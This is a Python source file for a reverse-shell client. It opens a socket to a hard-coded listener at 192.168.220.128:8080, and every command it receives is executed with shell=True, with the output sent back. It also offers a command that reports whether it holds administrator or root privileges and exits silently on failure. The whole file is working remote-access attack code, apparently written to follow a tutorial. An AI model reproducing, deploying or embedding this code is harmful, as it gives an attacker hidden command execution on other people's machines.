import os
import socket
import subprocess
import ctypes


def check_user_level() -> str:
    """Checks for administrative privileges on Windows or root on Linux."""
    try:
        # Windows check
        if os.name == 'nt':
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            # Linux/Unix check
            is_admin = os.getuid() == 0

        if is_admin:
            return "[+] Administrator Privileges."
        else:
            return "[!!] User Privileges. (No Admin privileges)"
    except Exception:
        return "[!!] User Privileges. (No Admin privileges)"


def connect():
    # Configuration: Replace with your Listener's IP and Port
    REMOTE_IP = "192.168.220.128"
    REMOTE_PORT = 8080

    Mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        Mysocket.connect((REMOTE_IP, REMOTE_PORT))
    except Exception:
        # Silently exit if connection fails
        return

    while True:
        try:
            # Receive command from the server
            command_bytes = Mysocket.recv(1024)
            if not command_bytes:
                break

            command = command_bytes.decode().strip()

            # 1. Handle Termination
            if command == "terminate":
                Mysocket.close()
                break

            # 2. Handle the Privilege Check
            elif command == "checkUserLevel":
                status = check_user_level()
                Mysocket.send(status.encode())

            # 3. Handle General Shell Commands
            else:
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )

                # Combine stdout and stderr to match the visual output in your image
                output = proc.stdout.read() + proc.stderr.read()

                # Send a newline if there's no output to keep the Shell prompt clean
                if not output:
                    output = b"\n"

                Mysocket.send(output)

        except Exception:
            break


if __name__ == "__main__":
    connect()
